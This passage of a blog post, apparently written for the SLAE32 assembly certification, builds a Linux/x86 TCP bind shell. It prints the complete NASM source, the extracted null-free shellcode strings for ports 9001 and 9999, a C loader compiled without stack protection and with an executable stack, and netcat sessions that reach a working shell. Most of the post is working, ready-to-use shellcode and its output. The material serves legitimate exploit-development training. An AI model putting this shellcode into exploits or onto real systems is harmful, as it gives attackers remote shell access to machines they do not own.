<p>There are various ways, but what we can do is &ldquo;abuse&rdquo; the slashes. Using <code>/</code> or <code>//</code> is the same in the Linux environment. Using this knowledge we can use the string <code>/bin//sh</code> to fulfill memory aligment requirements.</p>
<blockquote>
<p>As an extra challenge I leverage this task to develop a script called the <code>The x86 &quot;Little-Hexdian&quot; String Convert</code> which checks if a string passed as an argument is aligned and converts it to hexadecimal in little-endian format.</p>
</blockquote>
<p>Here&rsquo;s a screenshot of the script output.</p>
<p><img loading="lazy" src="/slae32/1/image14.png#center" alt="revHex32"  title="Little-Hexdian"  />
</p>
<blockquote>
<p>Available in <a href="https://github.com/0xnibbles/slae_x86/blob/main/revHex32.py">https://github.com/0xnibbles/slae_x86/blob/main/revHex32.py</a></p>
</blockquote>
<h3 id="final-assembly-code">Final Assembly Code<a hidden class="anchor" aria-hidden="true" href="#final-assembly-code">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#75715e">; Student ID   : PA-31319
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">; Student Name : Eduardo Silva
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">; Assignment 1 : TCP Bind Shell (Linux/x86) Assembly
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">; File Name    : bind_shell.nasm
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">global</span>	<span style="color:#66d9ef">_start</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">section</span>	<span style="color:#66d9ef">.text</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>_start:
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">eax</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">cdq</span>
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">; socket syscall
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ax</span>, <span style="color:#ae81ff">0x167</span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">;xor ebx, ebx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">;mov bl, 0x02
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">push</span> <span style="color:#66d9ef">byte</span> <span style="color:#ae81ff">0x02</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">pop</span> <span style="color:#66d9ef">ebx</span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">;xor ecx, ecx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">;mov cl, 0x01
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">push</span> <span style="color:#66d9ef">byte</span> <span style="color:#ae81ff">0x01</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">pop</span> <span style="color:#66d9ef">ecx</span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">; edx is already zero
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>	<span style="color:#75715e">; interruption syscall or interrupt vector. Returns pointer to the socket in eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">; bind syscall
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#66d9ef">eax</span> 	<span style="color:#75715e">; moves socket address to ebx (first arg - sockfd)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">eax</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">push</span> <span style="color:#66d9ef">edx</span>	<span style="color:#75715e">; edx remains zero
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">; sockaddr struct	
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">push</span> <span style="color:#66d9ef">edx</span>	<span style="color:#75715e">; 0.0.0.0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">push</span> <span style="color:#66d9ef">word</span> <span style="color:#ae81ff">0x2923</span> <span style="color:#75715e">;little endian -&gt; 9001 = 0x2329
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">push</span> <span style="color:#66d9ef">word</span> <span style="color:#ae81ff">0x2</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">esp</span>
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">dl</span>, <span style="color:#ae81ff">0x10</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ax</span>, <span style="color:#ae81ff">0x169</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">; listen syscall
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">eax</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">ecx</span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">; ebx already has sockfd
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ax</span>, <span style="color:#ae81ff">0x16b</span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">;add ax, 0x2
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">; accept4 syscall
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">; ebx already has sockfd
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">eax</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">cdq</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">ecx</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">esi</span>, <span style="color:#66d9ef">esi</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ax</span>, <span style="color:#ae81ff">0x16c</span> 	
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> <span style="color:#ae81ff">0x80</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">;xor edi, edi
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">eax</span> <span style="color:#75715e">; edx is already zero
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">; dup2
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">cl</span>, <span style="color:#ae81ff">0x03</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>dup2:
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">push</span> <span style="color:#66d9ef">byte</span> <span style="color:#ae81ff">0x3f</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">pop</span> <span style="color:#66d9ef">eax</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#66d9ef">edx</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">dec</span> <span style="color:#66d9ef">cl</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">jnz</span> <span style="color:#66d9ef">dup2</span>	<span style="color:#75715e">; decrements ecx and jumps until ecx=0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">; execve
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">cdq</span>	<span style="color:#75715e">; edx needs to be zero
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">;push eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">push</span> <span style="color:#66d9ef">ecx</span>	<span style="color:#75715e">; ecx is zero because jnz
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">push</span> <span style="color:#ae81ff">0x68732f2f</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">push</span> <span style="color:#ae81ff">0x6e69622f</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#66d9ef">esp</span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">;xor eax, eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">;mov al, 0xb
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">push</span> <span style="color:#66d9ef">byte</span> <span style="color:#ae81ff">0xb</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">pop</span> <span style="color:#66d9ef">eax</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x80</span>	
</span></span></code></pre></div><h3 id="compiling-and-testing-the-shellcode">Compiling and Testing the Shellcode<a hidden class="anchor" aria-hidden="true" href="#compiling-and-testing-the-shellcode">#</a></h3>
<p>To be easier to compile my shellcode scripts and get the size and the opcodes, I developed a shell script named <code>assembler.sh</code></p>
<blockquote>
<p>Available in <a href="https://github.com/0xnibbles/slae_x86/blob/main/assembler.sh">https://github.com/0xnibbles/slae_x86/blob/main/assembler.sh</a></p>
</blockquote>
<p>Checking <code>assembler.sh</code> output</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86/assignments/1-Shell_Bind_TCP ‹main› 
</span></span><span style="display:flex;"><span>╰─$ ls
</span></span><span style="display:flex;"><span>bind  bind.c  bind_shell  bind_shell.asm  bind_shell.nasm  bind_shell.o  biShell.sh  original_bind_shell.nasm  syscalls
</span></span><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86/assignments/1-Shell_Bind_TCP ‹main› 
</span></span><span style="display:flex;"><span>╰─$ ../../assembler.sh bind_shell.nasm 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Compiling with NASM
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Linking
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Extracting opcodes
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Done
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Shellcode size: <span style="color:#ae81ff">95</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x31\xc0\x99\x66\xb8\x67\x01\x6a\x02\x5b\x6a\x01\x59\xcd\x80\x89\xc3\x31\xc0\x52\x52\x66\x68\x23\x29\x66\x6a\x02\x89\xe1\xb2\x10\x66\xb8\x69\x01\xcd\x80\x31\xc0\x31\xc9\x66\xb8\x6b\x01\xcd\x80\x31\xc0\x99\x31\xc9\x31\xf6\x66\xb8\x6c\x01\xcd\x80\x89\xc2\xb1\x03\x6a\x3f\x58\x89\xd3\xfe\xc9\xcd\x80\x75\xf5\x99\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x6a\x0b\x58\xcd\x80&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>--------------------
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Hack the World!
</span></span><span style="display:flex;"><span>--------------------
</span></span></code></pre></div><p>No null bytes appear in the shellcode. We are good to go and paste the shellcode to our shellcode.c program</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> code[] <span style="color:#f92672">=</span> \
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0\x99\x66\xb8\x67\x01\x6a\x02\x5b\x6a\x01\x59\xcd\x80\x89\xc3\x31\xc0\x52\x52\x66\x68\x23\x29\x66\x6a\x02\x89\xe1\xb2\x10\x66\xb8\x69\x01\xcd\x80\x31\xc0\x31\xc9\x66\xb8\x6b\x01\xcd\x80\x31\xc0\x99\x31\xc9\x31\xf6\x66\xb8\x6c\x01\xcd\x80\x89\xc2\xb1\x03\x6a\x3f\x58\x89\xd3\xfe\xc9\xcd\x80\x75\xf5\x99\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x6a\x0b\x58\xcd\x80</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Shellcode Length: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">strlen</span>(code));
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>ret)() <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>(<span style="color:#f92672">*</span>)())code;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ret</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Compiling with <code>gcc</code> and executing it</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ gcc -fno-stack-protector -m32 -z execstack -o shellcode shellcode.c
</span></span><span style="display:flex;"><span>shellcode.c:7:1: warning: <span style="color:#66d9ef">return</span> type defaults to ‘int’ <span style="color:#f92672">[</span>-Wimplicit-int<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span> main<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span> ^~~~
</span></span><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86/assignments/1-Shell_Bind_TCP ‹main●› 
</span></span><span style="display:flex;"><span>╰─$ ./bind_shell 
</span></span><span style="display:flex;"><span>Shellcode Length: <span style="color:#ae81ff">95</span>
</span></span></code></pre></div><p>No errors and our bind shell is awaiting for a connection. Let&rsquo;s use <code>nc</code> to perform that.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>╭─edu@debian ~/Documents/blogGithub/dev-blog/0xnibbles ‹master●› 
</span></span><span style="display:flex;"><span>╰─$ nc -nv 127.0.0.1 <span style="color:#ae81ff">9001</span> 
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>127.0.0.1<span style="color:#f92672">]</span> <span style="color:#ae81ff">9001</span> <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span> open
</span></span><span style="display:flex;"><span>ls
</span></span><span style="display:flex;"><span>biShell.sh
</span></span><span style="display:flex;"><span>bind
</span></span><span style="display:flex;"><span>bind.c
</span></span><span style="display:flex;"><span>bind_shell
</span></span><span style="display:flex;"><span>bind_shell.asm
</span></span><span style="display:flex;"><span>bind_shell.nasm
</span></span><span style="display:flex;"><span>bind_shell.o
</span></span><span style="display:flex;"><span>original_bind_shell.nasm
</span></span><span style="display:flex;"><span>shellcode.c
</span></span><span style="display:flex;"><span>syscalls
</span></span><span style="display:flex;"><span>id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>edu<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>edu<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>edu<span style="color:#f92672">)</span>,24<span style="color:#f92672">(</span>cdrom<span style="color:#f92672">)</span>,25<span style="color:#f92672">(</span>floppy<span style="color:#f92672">)</span>,27<span style="color:#f92672">(</span>sudo<span style="color:#f92672">)</span>,29<span style="color:#f92672">(</span>audio<span style="color:#f92672">)</span>,30<span style="color:#f92672">(</span>dip<span style="color:#f92672">)</span>,44<span style="color:#f92672">(</span>video<span style="color:#f92672">)</span>,46<span style="color:#f92672">(</span>plugdev<span style="color:#f92672">)</span>,109<span style="color:#f92672">(</span>netdev<span style="color:#f92672">)</span>,111<span style="color:#f92672">(</span>bluetooth<span style="color:#f92672">)</span>,115<span style="color:#f92672">(</span>lpadmin<span style="color:#f92672">)</span>,116<span style="color:#f92672">(</span>scanner<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Fantastic! The TCP Bind Shell works as expected and was successfully injected into a working program.</p>
<h4 id="what-if-we-want-to-change-the-bind-port">What if we want to change the bind port?<a hidden class="anchor" aria-hidden="true" href="#what-if-we-want-to-change-the-bind-port">#</a></h4>
<p>One of the requirements for this assigment, is the ability to change easily the bind port used in the shellcode. For that, we can change the bytes in shellcode related to the port and changed them for specific port we want the bind shell waits for a connection.</p>
<p>The following shell script named <code>biShell.sh</code> replaces the hardcoded <code>9001</code> with the port provided by the user as an argument. It automatically converts the port into hexadecimal little-endian format.</p>
<blockquote>
<p>Available at <a href="https://github.com/0xnibbles/slae_x86/blob/main/assignments/1-Shell_Bind_TCP/biShell.sh">https://github.com/0xnibbles/slae_x86/blob/main/assignments/1-Shell_Bind_TCP/biShell.sh</a></p>
</blockquote>
<p>It accepts one argument - the desired bind port.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86/assignments/1-Shell_Bind_TCP ‹main●› 
</span></span><span style="display:flex;"><span>╰─$ ./biShell.sh <span style="color:#ae81ff">9999</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Doing magic with your port number
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Done
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Enjoy this Bind TCP Shellcode with the port <span style="color:#ae81ff">9999</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x31\xc0\x31\xdb\x31\xc9\x99\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc3\x31\xc0\x52\x52\x66\x68\x27\x0F\x66\x6a\x02\x89\xe1\xb2\x10\x66\xb8\x69\x01\xcd\x80\x31\xc0\x31\xc9\x66\xb8\x6b\x01\xcd\x80\x31\xc0\x99\x31\xc9\x31\xf6\x66\xb8\x6c\x01\xcd\x80\x31\xff\x89\xc7\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Port converted in hex Little-Endian: 270F
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>--------------------
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Hack the World!
</span></span><span style="display:flex;"><span>--------------------
</span></span></code></pre></div><p>Compiling using our shellcode tester and executing it</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86/assignments/1-Shell_Bind_TCP ‹main●› 
</span></span><span style="display:flex;"><span>╰─$ gcc -fno-stack-protector -m32 -z execstack -o bind_shell9999 shellcode.c
</span></span><span style="display:flex;"><span>shellcode.c:7:1: warning: <span style="color:#66d9ef">return</span> type defaults to ‘int’ <span style="color:#f92672">[</span>-Wimplicit-int<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span> main<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span> ^~~~
</span></span><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86/assignments/1-Shell_Bind_TCP ‹main●› 
</span></span><span style="display:flex;"><span>╰─$ ./bind_shell9999 
</span></span><span style="display:flex;"><span>Shellcode Length: <span style="color:#ae81ff">101</span>
</span></span></code></pre></div><p>Trying to establish a connection to port <code>9999</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>╭─edu@debian ~/Documents/blogGithub/dev-blog/0xnibbles ‹master●› 
</span></span><span style="display:flex;"><span>╰─$ nc -nv 127.0.0.1 <span style="color:#ae81ff">9999</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>127.0.0.1<span style="color:#f92672">]</span> <span style="color:#ae81ff">9999</span> <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span> open
</span></span><span style="display:flex;"><span>ls
</span></span><span style="display:flex;"><span>biShell.sh
</span></span><span style="display:flex;"><span>bind
</span></span><span style="display:flex;"><span>bind.c
</span></span><span style="display:flex;"><span>bind_shell
</span></span><span style="display:flex;"><span>bind_shell.asm
</span></span><span style="display:flex;"><span>bind_shell.nasm
</span></span><span style="display:flex;"><span>bind_shell.o
</span></span><span style="display:flex;"><span>bind_shell9999
</span></span><span style="display:flex;"><span>original_bind_shell.nasm
</span></span><span style="display:flex;"><span>shellcode.c
</span></span><span style="display:flex;"><span>syscalls
</span></span><span style="display:flex;"><span>id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>edu<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>edu<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>edu<span style="color:#f92672">)</span>,24<span style="color:#f92672">(</span>cdrom<span style="color:#f92672">)</span>,25<span style="color:#f92672">(</span>floppy<span style="color:#f92672">)</span>,27<span style="color:#f92672">(</span>sudo<span style="color:#f92672">)</span>,29<span style="color:#f92672">(</span>audio<span style="color:#f92672">)</span>,30<span style="color:#f92672">(</span>dip<span style="color:#f92672">)</span>,44<span style="color:#f92672">(</span>video<span style="color:#f92672">)</span>,46<span style="color:#f92672">(</span>plugdev<span style="color:#f92672">)</span>,109<span style="color:#f92672">(</span>netdev<span style="color:#f92672">)</span>,111<span style="color:#f92672">(</span>bluetooth<span style="color:#f92672">)</span>,115<span style="color:#f92672">(</span>lpadmin<span style="color:#f92672">)</span>,116<span style="color:#f92672">(</span>scanner<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>We get a shell!!!</p>
<hr>
<p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: <a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></p>
<p><code>Student ID: PA-31319</code></p>
<p>All the source code files are available on GitHub at <a href="https://github.com/0xnibbles/slae_x86">https://github.com/0xnibbles/slae_x86</a></p>
<hr>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://0xnibbles.github.io/tags/slae32/">slae32</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="https://0xnibbles.github.io/posts/slae_32_assignment_2/">
    <span class="title">« Prev</span>
    <br>
    <span>SLAE32 Assignment 2 - TCP Reverse Shellcode</span>
  </a>
</nav>


<div class="share-buttons">
    <a target="_blank" rel="noopener noreferrer" aria-label="share SLAE32 Assignment 1 - TCP Bind Shellcode on twitter"
        href="https://twitter.com/intent/tweet/?text=SLAE32%20Assignment%201%20-%20TCP%20Bind%20Shellcode&amp;url=https%3a%2f%2f0xnibbles.github.io%2fposts%2fslae_32_assignment_1%2f&amp;hashtags=slae32">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-253.927,424.544c135.939,0 210.268,-112.643 210.268,-210.268c0,-3.218 0,-6.437 -0.153,-9.502c14.406,-10.421 26.973,-23.448 36.935,-38.314c-13.18,5.824 -27.433,9.809 -42.452,11.648c15.326,-9.196 26.973,-23.602 32.49,-40.92c-14.252,8.429 -30.038,14.56 -46.896,17.931c-13.487,-14.406 -32.644,-23.295 -53.946,-23.295c-40.767,0 -73.87,33.104 -73.87,73.87c0,5.824 0.613,11.494 1.992,16.858c-61.456,-3.065 -115.862,-32.49 -152.337,-77.241c-6.284,10.881 -9.962,23.601 -9.962,37.088c0,25.594 13.027,48.276 32.95,61.456c-12.107,-0.307 -23.448,-3.678 -33.41,-9.196l0,0.92c0,35.862 25.441,65.594 59.311,72.49c-6.13,1.686 -12.72,2.606 -19.464,2.606c-4.751,0 -9.348,-0.46 -13.946,-1.38c9.349,29.426 36.628,50.728 68.965,51.341c-25.287,19.771 -57.164,31.571 -91.8,31.571c-5.977,0 -11.801,-0.306 -17.625,-1.073c32.337,21.15 71.264,33.41 112.95,33.41Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share SLAE32 Assignment 1 - TCP Bind Shellcode on linkedin"
        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2f0xnibbles.github.io%2fposts%2fslae_32_assignment_1%2f&amp;title=SLAE32%20Assignment%201%20-%20TCP%20Bind%20Shellcode&amp;summary=SLAE32%20Assignment%201%20-%20TCP%20Bind%20Shellcode&amp;source=https%3a%2f%2f0xnibbles.github.io%2fposts%2fslae_32_assignment_1%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
            <path
